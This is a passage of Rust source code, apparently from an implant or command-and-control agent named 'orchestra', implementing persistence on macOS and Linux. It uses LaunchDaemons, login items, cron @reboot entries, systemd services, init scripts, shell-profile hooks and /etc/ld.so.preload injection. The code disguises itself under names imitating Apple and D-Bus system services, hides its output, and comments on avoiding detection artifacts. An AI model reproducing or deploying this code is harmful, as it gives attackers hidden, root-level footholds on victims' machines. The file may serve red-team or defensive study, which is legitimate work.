            let current = Self::read_crontab();
            Ok(current.lines().any(|line| line.contains(CRON_MARKER)))
        }
    }

    /// Install both LaunchAgent (preferred) and cron fallback.
    pub fn install_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let cfg = crate::config::load_config()
            .unwrap_or_default()
            .persistence;

        if cfg.launch_agent {
            if let Err(e) = LaunchAgent::default().install(&exe) {
                log::warn!("LaunchAgent install failed (non-fatal): {}", e);
            }
        }
        if cfg.cron_job {
            if let Err(e) = CronJob.install(&exe) {
                log::warn!("CronJob install failed (non-fatal): {}", e);
            }
        }
        if cfg.launch_daemon {
            if let Err(e) = LaunchDaemon::default().install(&exe) {
                log::warn!("LaunchDaemon install failed (non-fatal): {}", e);
            }
        }
        if cfg.login_item {
            if let Err(e) = LoginItem::default().install(&exe) {
                log::warn!("LoginItem install failed (non-fatal): {}", e);
            }
        }

        Ok(exe)
    }

    pub fn uninstall_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let _ = LaunchAgent::default().remove();
        let _ = CronJob.remove();
        let _ = LaunchDaemon::default().remove();
        let _ = LoginItem::default().remove();
        Ok(exe)
    }

    // ── 5.1: LaunchDaemon (system-level, requires root) ───────────────────────

    /// LaunchDaemon persistence (system-level, runs as root on boot).
    /// Requires elevated privileges; the plist is placed in /Library/LaunchDaemons/.
    pub struct LaunchDaemon {
        pub label: String,
    }

    impl Default for LaunchDaemon {
        fn default() -> Self {
            Self {
                label: "com.apple.xpc.mdmclient-helper".to_string(),
            }
        }
    }

    impl Persist for LaunchDaemon {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            // Root check: /Library/LaunchDaemons is root-owned.
            #[cfg(target_os = "macos")]
            unsafe {
                if libc::getuid() != 0 {
                    return Err(anyhow!("LaunchDaemon::install: requires root"));
                }
            }
            let plist = format!(
                r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>"#,
                label = self.label,
                exe = executable_path.display()
            );
            let daemons_dir = std::path::Path::new("/Library/LaunchDaemons");
            std::fs::create_dir_all(daemons_dir)
                .map_err(|e| anyhow!("LaunchDaemon::install: mkdir: {}", e))?;
            let plist_path = daemons_dir.join(format!("{}.plist", self.label));
            std::fs::write(&plist_path, plist)
                .map_err(|e| anyhow!("LaunchDaemon::install: write: {}", e))?;
            #[cfg(target_os = "macos")]
            {
                let _ = std::process::Command::new("launchctl")
                    .args(["bootstrap", "system", &plist_path.to_string_lossy()])
                    .status();
            }
            log::info!(
                "LaunchDaemon::install: installed '{}'",
                plist_path.display()
            );
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let plist_path = std::path::Path::new("/Library/LaunchDaemons")
                .join(format!("{}.plist", self.label));
            #[cfg(target_os = "macos")]
            {
                let _ = std::process::Command::new("launchctl")
                    .args(["bootout", "system", &plist_path.to_string_lossy()])
                    .status();
            }
            let _ = std::fs::remove_file(&plist_path);
            log::info!("LaunchDaemon::remove: removed '{}'", self.label);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            Ok(std::path::Path::new("/Library/LaunchDaemons")
                .join(format!("{}.plist", self.label))
                .exists())
        }
    }

    // ── 5.1: LoginItems ───────────────────────────────────────────────────────

    type CFStringRef = *const std::ffi::c_void;
    const K_CFSTRING_ENCODING_UTF8: u32 = 0x0800_0100;

    #[link(name = "ServiceManagement", kind = "framework")]
    extern "C" {
        fn SMLoginItemSetEnabled(identifier: CFStringRef, enabled: u8) -> u8;
    }

    #[link(name = "CoreFoundation", kind = "framework")]
    extern "C" {
        fn CFStringCreateWithCString(
            alloc: *const std::ffi::c_void,
            c_str: *const std::os::raw::c_char,
            encoding: u32,
        ) -> CFStringRef;
        fn CFRelease(cf: *const std::ffi::c_void);
    }

    #[derive(Clone, Copy, Debug, PartialEq, Eq)]
    enum LoginItemStrategy {
        ServiceManagement,
        LaunchAgentFallback,
    }

    struct SmHelperContext {
        helper_bundle_path: PathBuf,
        helper_bundle_id: String,
    }

    /// LoginItems persistence with automatic strategy selection.
    ///
    /// Strategy selection:
    /// 1) If the executable is running from inside an `.app` bundle, use
    ///    ServiceManagement (SMAppService on macOS 13+, otherwise
    ///    `SMLoginItemSetEnabled`) and require a helper app
    ///    at:
    ///    `<MainApp>.app/Contents/Library/LoginItems/<app_name>.app`
    /// 2) Otherwise, fall back to the existing GUI LaunchAgent strategy
    ///    (`asuser_bootstrap: true`).
    ///
    /// ServiceManagement requirement:
    /// The helper login item app **must** be embedded in
    /// `Contents/Library/LoginItems`. If it is missing, installation returns an
    /// error describing the expected location.
    pub struct LoginItem {
        pub app_name: String,
    }

    impl Default for LoginItem {
        fn default() -> Self {
            Self {
                app_name: "System Update Helper".to_string(),
            }
        }
    }

    impl LoginItem {
        fn strategy_for_executable(executable_path: &Path) -> LoginItemStrategy {
            if Self::app_bundle_root(executable_path).is_some() {
                LoginItemStrategy::ServiceManagement
            } else {
                LoginItemStrategy::LaunchAgentFallback
            }
        }

        fn app_bundle_root(executable_path: &Path) -> Option<PathBuf> {
            let mut cur = executable_path.parent();
            while let Some(p) = cur {
                let is_app = p
                    .extension()
                    .and_then(|e| e.to_str())
                    .map(|e| e.eq_ignore_ascii_case("app"))
                    .unwrap_or(false);
                if is_app {
                    return Some(p.to_path_buf());
                }
                cur = p.parent();
            }
            None
        }

        fn helper_bundle_path_for_executable(&self, executable_path: &Path) -> Option<PathBuf> {
            let app_root = Self::app_bundle_root(executable_path)?;
            Some(
                app_root
                    .join("Contents")
                    .join("Library")
                    .join("LoginItems")
                    .join(format!("{}.app", self.app_name)),
            )
        }

        fn read_helper_bundle_id(helper_bundle_path: &Path) -> Result<String> {
            let info_plist = helper_bundle_path.join("Contents").join("Info.plist");
            if !info_plist.exists() {
                return Err(anyhow!(
                    "LoginItem: missing helper Info.plist at '{}'",
                    info_plist.display()
                ));
            }

            let out = std::process::Command::new("defaults")
                .arg("read")
                .arg(&info_plist)
                .arg("CFBundleIdentifier")
                .output()
                .map_err(|e| anyhow!("LoginItem: defaults read CFBundleIdentifier: {}", e))?;

            if !out.status.success() {
                let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
                let detail = if stderr.is_empty() {
                    "no stderr output".to_string()
                } else {
                    stderr
                };
                return Err(anyhow!(
                    "LoginItem: failed to read helper bundle identifier from '{}': {}",
                    info_plist.display(),
                    detail
                ));
            }

            let id = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if id.is_empty() {
                return Err(anyhow!(
                    "LoginItem: helper CFBundleIdentifier is empty in '{}'",
                    info_plist.display()
                ));
            }
            Ok(id)
        }

        fn resolve_sm_helper_context(&self, executable_path: &Path) -> Result<SmHelperContext> {
            let helper_bundle_path = self
                .helper_bundle_path_for_executable(executable_path)
                .ok_or_else(|| {
                    anyhow!(
                        "LoginItem::install: executable is not running from an application bundle"
                    )
                })?;

            if !helper_bundle_path.exists() {
                return Err(anyhow!(
                    "LoginItem::install: ServiceManagement requires helper app at '{}'. \
                     Place the helper in '<MainApp>.app/Contents/Library/LoginItems/' and retry.",
                    helper_bundle_path.display()
                ));
            }

            let helper_bundle_id = Self::read_helper_bundle_id(&helper_bundle_path)?;
            Ok(SmHelperContext {
                helper_bundle_path,
                helper_bundle_id,
            })
        }

        fn sm_set_enabled(helper_bundle_id: &str, enabled: bool) -> Result<()> {
            if Self::is_macos_13_or_later() {
                match Self::sm_set_enabled_via_app_service(helper_bundle_id, enabled) {
                    Ok(()) => return Ok(()),
                    Err(e) => {
                        log::warn!(
                            "LoginItem: SMAppService path failed ({}); falling back to SMLoginItemSetEnabled",
                            e
                        );
                    }
                }
            }

            Self::sm_set_enabled_legacy(helper_bundle_id, enabled)
        }

        fn is_macos_13_or_later() -> bool {
            let out = match std::process::Command::new("sw_vers")
                .arg("-productVersion")
                .output()
            {
                Ok(o) => o,
                Err(_) => return false,
            };
            if !out.status.success() {
                return false;
            }
            let version = String::from_utf8_lossy(&out.stdout);
            let major = version
                .trim()
                .split('.')
                .next()
                .and_then(|s| s.parse::<u32>().ok())
                .unwrap_or(0);
            major >= 13
        }

        fn sm_set_enabled_via_app_service(helper_bundle_id: &str, enabled: bool) -> Result<()> {
            // Use the `servicectl` CLI (shipped since macOS 13 Ventura) to
            // enable or disable an SMAppService-registered login item.  This
            // replaces the previous hand-rolled ObjC runtime approach
            // (objc_getClass / sel_registerName / objc_msgSend transmute) which
            // depended on exact selector-string matching and could silently
            // break across macOS updates.
            let action = if enabled { "enable" } else { "disable" };
            let status = std::process::Command::new("servicectl")
                .arg(action)
                .arg(helper_bundle_id)
                .status()
                .map_err(|e| {
                    anyhow!(
                        "LoginItem: servicectl {} '{}': {}",
                        action, helper_bundle_id, e
                    )
                })?;
            if !status.success() {
                return Err(anyhow!(
                    "LoginItem: servicectl {} '{}' returned non-zero exit status",
                    action, helper_bundle_id
                ));
            }
            log::info!(
                "LoginItem: servicectl {} '{}' succeeded",
                action, helper_bundle_id
            );
            Ok(())
        }

        fn sm_set_enabled_legacy(helper_bundle_id: &str, enabled: bool) -> Result<()> {
            use std::ffi::CString;

            let c_id = CString::new(helper_bundle_id)
                .map_err(|_| anyhow!("LoginItem: helper bundle id contains NUL byte"))?;

            unsafe {
                let cf_id = CFStringCreateWithCString(
                    std::ptr::null(),
                    c_id.as_ptr(),
                    K_CFSTRING_ENCODING_UTF8,
                );
                if cf_id.is_null() {
                    return Err(anyhow!(
                        "LoginItem: CFStringCreateWithCString failed for '{}'",
                        helper_bundle_id
                    ));
                }

                let ok = SMLoginItemSetEnabled(cf_id, if enabled { 1 } else { 0 }) != 0;
                CFRelease(cf_id);

                if !ok {
                    return Err(anyhow!(
                        "LoginItem: SMLoginItemSetEnabled({}, enabled={}) failed. \
                         Ensure helper app '{}' is signed and embedded correctly.",
                        helper_bundle_id,
                        enabled,
                        helper_bundle_id
                    ));
                }
            }

            Ok(())
        }

        fn install_via_service_management(&self, ctx: &SmHelperContext) -> Result<()> {
            Self::sm_set_enabled(&ctx.helper_bundle_id, true)?;
            log::info!(
                "LoginItem::install: enabled ServiceManagement helper '{}' from '{}'",
                ctx.helper_bundle_id,
                ctx.helper_bundle_path.display()
            );
            Ok(())
        }

        fn remove_via_service_management(&self, ctx: &SmHelperContext) -> Result<()> {
            Self::sm_set_enabled(&ctx.helper_bundle_id, false)?;
            log::info!(
                "LoginItem::remove: disabled ServiceManagement helper '{}'",
                ctx.helper_bundle_id
            );
            Ok(())
        }

        fn verify_via_service_management(&self, ctx: &SmHelperContext) -> Result<bool> {
            let uid = unsafe { libc::getuid() };
            let service = format!("gui/{}/{}", uid, ctx.helper_bundle_id);
            let status = std::process::Command::new("launchctl")
                .arg("asuser")
                .arg(uid.to_string())
                .arg("launchctl")
                .arg("print")
                .arg(&service)
                .status()
                .map_err(|e| anyhow!("LoginItem::verify: launchctl asuser print: {}", e))?;
            Ok(status.success())
        }

        fn as_launch_agent(&self) -> LaunchAgent {
            LaunchAgent {
                label: format!(
                    "com.{}.helper",
                    self.app_name.to_ascii_lowercase().replace(' ', "-")
                ),
                asuser_bootstrap: true,
            }
        }
    }

    impl Persist for LoginItem {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            match Self::strategy_for_executable(executable_path) {
                LoginItemStrategy::ServiceManagement => {
                    let ctx = self.resolve_sm_helper_context(executable_path)?;
                    self.install_via_service_management(&ctx)
                }
                LoginItemStrategy::LaunchAgentFallback => {
                    log::info!(
                        "LoginItem::install: executable is not in an app bundle; using LaunchAgent fallback"
                    );
                    self.as_launch_agent().install(executable_path)
                }
            }
        }

        fn remove(&self) -> Result<()> {
            let exe = match std::env::current_exe() {
                Ok(p) => p,
                Err(_) => return self.as_launch_agent().remove(),
            };

            match Self::strategy_for_executable(&exe) {
                LoginItemStrategy::ServiceManagement => {
                    let ctx = self.resolve_sm_helper_context(&exe)?;
                    self.remove_via_service_management(&ctx)
                }
                LoginItemStrategy::LaunchAgentFallback => self.as_launch_agent().remove(),
            }
        }

        fn verify(&self) -> Result<bool> {
            let exe = match std::env::current_exe() {
                Ok(p) => p,
                Err(_) => return self.as_launch_agent().verify(),
            };

            match Self::strategy_for_executable(&exe) {
                LoginItemStrategy::ServiceManagement => {
                    let launch_agent_ok = self.as_launch_agent().verify().unwrap_or(false);
                    let sm_ok = match self.resolve_sm_helper_context(&exe) {
                        Ok(ctx) => self.verify_via_service_management(&ctx)?,
                        Err(_) => false,
                    };
                    Ok(sm_ok || launch_agent_ok)
                }
                LoginItemStrategy::LaunchAgentFallback => self.as_launch_agent().verify(),
            }
        }
    }
}

// ──────────────────────────────────────────────────────────────────────────────
// Linux persistence implementations
// ──────────────────────────────────────────────────────────────────────────────
#[cfg(target_os = "linux")]
pub use linux::*;
#[cfg(target_os = "linux")]
pub mod linux {
    use super::{Persist, shell_quote_single};
    use anyhow::{anyhow, Result};
    use std::io::Write;
    use std::path::PathBuf;

    const CRON_MARKER: &str = "# orchestra-managed-persistence";
    const SHELL_MARKER_BEGIN: &str = "# orchestra-managed-persistence begin";
    const SHELL_MARKER_END: &str = "# orchestra-managed-persistence end";

    // ── FR-3A: Systemd user service ───────────────────────────────────────────
    pub struct SystemdService {
        pub service_name: String,
    }

    impl Default for SystemdService {
        fn default() -> Self {
            Self {
                service_name: "dbus-daemon-user".to_string(),
            }
        }
    }

    impl Persist for SystemdService {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let exe = executable_path.to_string_lossy();
            let unit = format!(
                "[Unit]\nDescription=D-Bus User Session Proxy\nAfter=default.target\n\n\
                [Service]\nType=simple\nExecStart={exe}\nRestart=always\nRestartSec=10\n\n\
                [Install]\nWantedBy=default.target\n"
            );
            let unit_dir = dirs::home_dir()
                .ok_or_else(|| anyhow!("SystemdService: no home dir"))?
                .join(".config/systemd/user");
            std::fs::create_dir_all(&unit_dir)
                .map_err(|e| anyhow!("SystemdService: mkdir: {}", e))?;
            let unit_path = unit_dir.join(format!("{}.service", self.service_name));
            std::fs::write(&unit_path, unit)
                .map_err(|e| anyhow!("SystemdService: write: {}", e))?;
            let reload = std::process::Command::new("systemctl")
                .args(["--user", "daemon-reload"])
                .status()
                .map_err(|e| anyhow!("SystemdService: daemon-reload: {}", e))?;
            if !reload.success() {
                log::warn!("SystemdService::install: daemon-reload returned non-zero");
            }
            let enable = std::process::Command::new("systemctl")
                .args(["--user", "enable", "--now", &self.service_name])
                .status()
                .map_err(|e| anyhow!("SystemdService: enable --now: {}", e))?;
            if !enable.success() {
                return Err(anyhow!(
                    "SystemdService::install: enable --now '{}' failed",
                    self.service_name
                ));
            }
            log::info!("SystemdService::install: enabled '{}'", self.service_name);
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "disable", "--now", &self.service_name])
                .status();
            let unit_dir = match dirs::home_dir() {
                Some(h) => h.join(".config/systemd/user"),
                None => return Ok(()),
            };
            let _ = std::fs::remove_file(unit_dir.join(format!("{}.service", self.service_name)));
            let _ = std::process::Command::new("systemctl")
                .args(["--user", "daemon-reload"])
                .status();
            log::info!("SystemdService::remove: removed '{}'", self.service_name);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let out = std::process::Command::new("systemctl")
                .args(["--user", "is-enabled", &self.service_name])
                .output()
                .map_err(|e| anyhow!("SystemdService::verify: {}", e))?;
            Ok(String::from_utf8_lossy(&out.stdout).trim() == "enabled")
        }
    }

    // ── FR-3B: Cron Job ───────────────────────────────────────────────────────
    pub struct CronJob;

    impl Persist for CronJob {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let exe = executable_path.to_string_lossy();
            let quoted_exe = shell_quote_single(exe.as_ref());
            let quoted_marker = shell_quote_single(CRON_MARKER);
            // Redirect both stdout and stderr to /dev/null so cron does not
            // attempt to mail the output to the user (which would be a detection artifact).
            let entry = format!("@reboot {} >/dev/null 2>&1 {}", quoted_exe, CRON_MARKER);
            let quoted_entry = shell_quote_single(&entry);
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!(
                    "(crontab -l 2>/dev/null | grep -v {}; echo {}) | crontab -",
                    quoted_marker, quoted_entry
                ))
                .status()
                .map_err(|e| anyhow!("CronJob::install: {}", e))?;
            if !out.success() {
                return Err(anyhow!("CronJob::install: crontab command failed"));
            }
            log::info!("CronJob::install: added @reboot entry for '{}'", exe);
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let quoted_marker = shell_quote_single(CRON_MARKER);
            let _ = std::process::Command::new("sh")
                .arg("-c")
                .arg(format!(
                    "crontab -l 2>/dev/null | grep -v {} | crontab -",
                    quoted_marker
                ))
                .status()
                .map_err(|e| anyhow!("CronJob::remove: {}", e))?;
            log::info!("CronJob::remove: removed managed @reboot entries");
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let out = std::process::Command::new("sh")
                .arg("-c")
                .arg("crontab -l 2>/dev/null")
                .output()
                .map_err(|e| anyhow!("CronJob::verify: {}", e))?;
            let stdout = String::from_utf8_lossy(&out.stdout);
            Ok(stdout.contains(CRON_MARKER))
        }
    }

    // ── FR-3C: Shell Profile (.bashrc / .profile) ─────────────────────────────
    pub struct ShellProfile;

    impl Persist for ShellProfile {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            let exe = executable_path.to_string_lossy();
            let home = dirs::home_dir().ok_or_else(|| anyhow!("ShellProfile: no home dir"))?;
            let mut profile_names = vec![".zshrc", ".bashrc", ".profile", ".bash_profile"];
            if let Ok(shell) = std::env::var("SHELL") {
                let shell = shell.to_ascii_lowercase();
                let preferred = if shell.contains("zsh") {
                    Some(".zshrc")
                } else if shell.contains("bash") {
                    Some(".bashrc")
                } else if shell.contains("fish") {
                    Some(".config/fish/config.fish")
                } else {
                    None
                };

                if let Some(profile) = preferred {
                    if let Some(idx) = profile_names.iter().position(|p| *p == profile) {
                        profile_names.remove(idx);
                    }
                    profile_names.insert(0, profile);
                }
            }

            for profile_name in &profile_names {
                let path = home.join(profile_name);
                if path.exists() {
                    let existing = std::fs::read_to_string(&path).unwrap_or_default();
                    if existing.contains(SHELL_MARKER_BEGIN) {
                        log::debug!(
                            "ShellProfile::install: already present in '{}'",
                            profile_name
                        );
                        return Ok(());
                    }
                    let mut file = std::fs::OpenOptions::new()
                        .append(true)
                        .open(&path)
                        .map_err(|e| {
                            anyhow!("ShellProfile::install: open '{}': {}", profile_name, e)
                        })?;
                    writeln!(
                        file,
                        "\n{}\n({} &) 2>/dev/null\n{}",
                        SHELL_MARKER_BEGIN, exe, SHELL_MARKER_END
                    )
                    .map_err(|e| anyhow!("ShellProfile::install: write: {}", e))?;
                    log::info!("ShellProfile::install: appended to '{}'", path.display());
                    return Ok(());
                }
            }
            Err(anyhow!(
                "ShellProfile::install: no suitable shell profile found"
            ))
        }

        fn remove(&self) -> Result<()> {
            let home = match dirs::home_dir() {
                Some(h) => h,
                None => return Ok(()),
            };
            for profile_name in &[".zshrc", ".bashrc", ".profile", ".bash_profile"] {
                let path = home.join(profile_name);
                if !path.exists() {
                    continue;
                }
                if let Ok(content) = std::fs::read_to_string(&path) {
                    let filtered = remove_shell_profile_block(&content);
                    let _ = std::fs::write(&path, filtered);
                }
            }
            log::info!("ShellProfile::remove: removed persistence entries");
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let home = match dirs::home_dir() {
                Some(h) => h,
                None => return Ok(false),
            };
            for profile_name in &[".zshrc", ".bashrc", ".profile", ".bash_profile"] {
                let path = home.join(profile_name);
                if let Ok(content) = std::fs::read_to_string(&path) {
                    if content.contains(SHELL_MARKER_BEGIN) || content.contains("# system-update-")
                    {
                        return Ok(true);
                    }
                }
            }
            Ok(false)
        }
    }

    /// Install only the user-level systemd unit by default. Other persistence
    /// mechanisms remain available as explicit building blocks, but are not
    /// enabled automatically because they have broader side effects and more
    /// platform-specific failure modes.
    pub fn install_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let cfg = crate::config::load_config()
            .unwrap_or_default()
            .persistence;

        if cfg.systemd_service {
            if let Err(e) = SystemdService::default().install(&exe) {
                log::warn!("SystemdService install failed (non-fatal): {}", e);
            }
        }
        if cfg.cron_job {
            if let Err(e) = CronJob.install(&exe) {
                log::warn!("CronJob install failed (non-fatal): {}", e);
            }
        }
        if cfg.shell_profile {
            if let Err(e) = ShellProfile.install(&exe) {
                log::warn!("ShellProfile install failed (non-fatal): {}", e);
            }
        }

        Ok(exe)
    }

    pub fn uninstall_persistence() -> Result<PathBuf> {
        let exe = std::env::current_exe()?;
        let _ = SystemdService::default().remove();
        let _ = CronJob.remove();
        let _ = ShellProfile.remove();
        Ok(exe)
    }

    // ── 5.2: Systemd system-wide service (root) ───────────────────────────────

    /// Systemd system service under /etc/systemd/system/.  Requires root.
    pub struct SystemdSystemService {
        pub service_name: String,
    }

    impl Default for SystemdSystemService {
        fn default() -> Self {
            Self {
                service_name: "dbus-broker-daemon".to_string(),
            }
        }
    }

    impl Persist for SystemdSystemService {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            if unsafe { libc::getuid() } != 0 {
                return Err(anyhow!("SystemdSystemService::install: requires root"));
            }
            let exe = executable_path.to_string_lossy();
            let unit = format!(
                "[Unit]\nDescription=D-Bus Broker Daemon\nAfter=network.target\n\n\
                [Service]\nType=simple\nExecStart={exe}\nRestart=always\nRestartSec=10\n\
                User=root\n\n[Install]\nWantedBy=multi-user.target\n"
            );
            let unit_dir = std::path::Path::new("/etc/systemd/system");
            std::fs::create_dir_all(unit_dir)
                .map_err(|e| anyhow!("SystemdSystemService: mkdir: {}", e))?;
            let unit_path = unit_dir.join(format!("{}.service", self.service_name));
            std::fs::write(&unit_path, unit)
                .map_err(|e| anyhow!("SystemdSystemService: write: {}", e))?;
            let _ = std::process::Command::new("systemctl")
                .args(["daemon-reload"])
                .status();
            let _ = std::process::Command::new("systemctl")
                .args(["enable", "--now", &self.service_name])
                .status();
            log::info!(
                "SystemdSystemService::install: enabled '{}'",
                self.service_name
            );
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let _ = std::process::Command::new("systemctl")
                .args(["disable", "--now", &self.service_name])
                .status();
            let path = std::path::Path::new("/etc/systemd/system")
                .join(format!("{}.service", self.service_name));
            let _ = std::fs::remove_file(&path);
            let _ = std::process::Command::new("systemctl")
                .args(["daemon-reload"])
                .status();
            log::info!(
                "SystemdSystemService::remove: removed '{}'",
                self.service_name
            );
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let out = std::process::Command::new("systemctl")
                .args(["is-enabled", &self.service_name])
                .output()
                .map_err(|e| anyhow!("SystemdSystemService::verify: {}", e))?;
            Ok(String::from_utf8_lossy(&out.stdout).trim() == "enabled")
        }
    }

    // ── 5.2: SysV init script ─────────────────────────────────────────────────

    /// SysV-style init script placed in /etc/init.d/ with rc runlevel symlinks.
    /// Requires root.
    pub struct InitScript {
        pub script_name: String,
    }

    impl Default for InitScript {
        fn default() -> Self {
            Self {
                script_name: "network-resolver".to_string(),
            }
        }
    }

    impl Persist for InitScript {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            if unsafe { libc::getuid() } != 0 {
                return Err(anyhow!("InitScript::install: requires root"));
            }
            let exe = executable_path.to_string_lossy();
            let script = format!(
                "#!/bin/sh\n### BEGIN INIT INFO\n# Provides:          {name}\n\
                # Required-Start:    $network\n# Required-Stop:     $network\n\
                # Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n\
                # Short-Description: Network Resolver Service\n### END INIT INFO\n\n\
                case \"$1\" in\n  start) {exe} &;;\n  stop) pkill -f '{exe}' || true;;\n\
                esac\nexit 0\n",
                name = self.script_name,
                exe = exe,
            );
            let initd = std::path::Path::new("/etc/init.d");
            std::fs::create_dir_all(initd).map_err(|e| anyhow!("InitScript: mkdir: {}", e))?;
            let script_path = initd.join(&self.script_name);
            std::fs::write(&script_path, script)
                .map_err(|e| anyhow!("InitScript: write: {}", e))?;
            // Set executable permission.
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&script_path, std::fs::Permissions::from_mode(0o755))
                .map_err(|e| anyhow!("InitScript: chmod: {}", e))?;
            // Create runlevel symlinks for runlevels 2, 3, 5.
            for rc in &["rc2.d", "rc3.d", "rc5.d"] {
                let rc_dir = std::path::Path::new("/etc").join(rc);
                if rc_dir.exists() {
                    let link = rc_dir.join(format!("S99{}", self.script_name));
                    let _ = std::os::unix::fs::symlink(&script_path, &link);
                }
            }
            log::info!("InitScript::install: installed '{}'", script_path.display());
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            for rc in &["rc2.d", "rc3.d", "rc5.d"] {
                let link = std::path::Path::new("/etc")
                    .join(rc)
                    .join(format!("S99{}", self.script_name));
                let _ = std::fs::remove_file(&link);
            }
            let _ =
                std::fs::remove_file(std::path::Path::new("/etc/init.d").join(&self.script_name));
            log::info!("InitScript::remove: removed '{}'", self.script_name);
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            Ok(std::path::Path::new("/etc/init.d")
                .join(&self.script_name)
                .exists())
        }
    }

    // ── 5.2: ld.so.preload injection ─────────────────────────────────────────

    /// Appends the agent's shared-object path to /etc/ld.so.preload so it is
    /// injected into every dynamically-linked process.  Requires root.
    pub struct LdPreload;

    impl Persist for LdPreload {
        fn install(&self, executable_path: &PathBuf) -> Result<()> {
            if unsafe { libc::getuid() } != 0 {
                return Err(anyhow!("LdPreload::install: requires root"));
            }
            if executable_path.extension().and_then(|ext| ext.to_str()) != Some("so") {
                return Err(anyhow!(
                    "LdPreload::install requires a shared object (.so); refusing executable path '{}'",
                    executable_path.display()
                ));
            }
            let path = executable_path.to_string_lossy();
            let preload_file = std::path::Path::new("/etc/ld.so.preload");
            // Read existing contents and check for duplicate entry.
            let existing = std::fs::read_to_string(preload_file).unwrap_or_default();
            if existing.lines().any(|l| l.trim() == path.as_ref()) {
                log::debug!("LdPreload::install: entry already present");
                return Ok(());
            }
            let mut file = std::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(preload_file)
                .map_err(|e| anyhow!("LdPreload::install: open: {}", e))?;
            writeln!(file, "{}", path).map_err(|e| anyhow!("LdPreload::install: write: {}", e))?;
            log::info!("LdPreload::install: added '{}' to /etc/ld.so.preload", path);
            Ok(())
        }

        fn remove(&self) -> Result<()> {
            let preload_file = std::path::Path::new("/etc/ld.so.preload");
            if !preload_file.exists() {
                return Ok(());
            }
            let exe = std::env::current_exe().unwrap_or_default();
            let exe_str = exe.to_string_lossy();
            let content = std::fs::read_to_string(preload_file).unwrap_or_default();
            let filtered: String = content
                .lines()
                .filter(|l| l.trim() != exe_str.as_ref())
                .map(|l| format!("{}\n", l))
                .collect();
            let _ = std::fs::write(preload_file, filtered);
            log::info!("LdPreload::remove: removed entry from /etc/ld.so.preload");
            Ok(())
        }

        fn verify(&self) -> Result<bool> {
            let preload_file = std::path::Path::new("/etc/ld.so.preload");
            if !preload_file.exists() {
                return Ok(false);
            }
            let exe = std::env::current_exe().unwrap_or_default();
            let exe_str = exe.to_string_lossy();
            let content = std::fs::read_to_string(preload_file).unwrap_or_default();
            Ok(content.lines().any(|l| l.trim() == exe_str.as_ref()))
        }
    }

    fn remove_shell_profile_block(content: &str) -> String {
        let mut out = Vec::new();
        let mut skipping_managed_block = false;
        let mut skip_legacy_next = false;
        for line in content.lines() {
            if skip_legacy_next {
                skip_legacy_next = false;
                continue;
            }
            if line.contains(SHELL_MARKER_BEGIN) {
                skipping_managed_block = true;
                continue;
            }
            if skipping_managed_block {
                if line.contains(SHELL_MARKER_END) {
                    skipping_managed_block = false;
                }
                continue;
            }
            if line.contains("# system-update-") {
                skip_legacy_next = true;
                continue;
            }
            out.push(line);
        }
        if out.is_empty() {
            String::new()
        } else {
            let mut filtered = out.join("\n");
            filtered.push('\n');
            filtered
        }
    }

    #[cfg(test)]
    mod tests {
        use super::*;

        #[test]
        fn shell_profile_remove_deletes_marker_and_command() {
            let content = "before\n# system-update-/tmp/a\n(/tmp/agent &) 2>/dev/null\nafter\n";
            let filtered = remove_shell_profile_block(content);
            assert!(filtered.contains("before"));
            assert!(filtered.contains("after"));
            assert!(!filtered.contains("system-update"));
            assert!(!filtered.contains("/tmp/agent"));
        }

        #[test]
        fn shell_profile_remove_deletes_managed_block() {
            let content = format!(
                "before\n{}\n(/tmp/agent &) 2>/dev/null\n{}\nafter\n",
                SHELL_MARKER_BEGIN, SHELL_MARKER_END
            );
            let filtered = remove_shell_profile_block(&content);
            assert_eq!(filtered, "before\nafter\n");
        }
    }
}
